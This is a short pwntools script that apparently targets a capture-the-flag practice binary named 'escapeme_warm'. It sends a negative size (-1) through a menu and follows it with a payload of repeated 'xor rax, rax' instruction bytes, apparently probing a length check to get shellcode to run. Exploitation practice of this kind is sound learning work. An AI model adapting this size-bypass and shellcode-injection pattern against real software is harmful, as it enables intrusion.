from pwn import *

io = process('./escapeme_warm')

def sendsc(size, shellcode):
    print(io.recv())
    io.sendline(b'1')
    print(io.recv())
    io.sendline(str(size))
    io.sendline(shellcode)

payload = b'\x48\x31\xC0'*2730
sendsc(-1, payload)
print(io.recv())
